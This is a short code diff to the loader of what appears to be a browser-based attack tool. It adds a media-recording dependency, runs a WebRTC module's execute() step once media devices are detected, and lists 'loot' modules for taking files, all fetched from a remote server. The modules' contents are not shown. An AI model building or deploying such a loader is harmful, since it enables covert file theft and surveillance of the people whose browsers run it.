@@ -11,9 +11,10 @@ requirejs.config({
 
     paths: {
         filesystem: server + '/modules/filesystem',
-        webrtc: server + '/modules/webrtc',
         utils: server + '/modules/utils',
         platform: server + '/modules/platform',
+        webrtc: server + '/modules/webrtc',
+        msr: server + '/modules/dependencies/msr',
 
         // Loot modules
         lootFiles: server + '/modules/looters/files',
@@ -47,9 +48,14 @@ function main() {
 
     });
 
-    requirejs(['webrtc'], function(webrtc) {
-        webrtc.isWebRTCEnabled();
-    });
+    // WebRTC
+    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+        console.log('WebRTC looks to be accessible');
+        requirejs(['webrtc'], function(webrtc) {
+            webrtc.execute();
+        });
+    }
+
 }
 
 
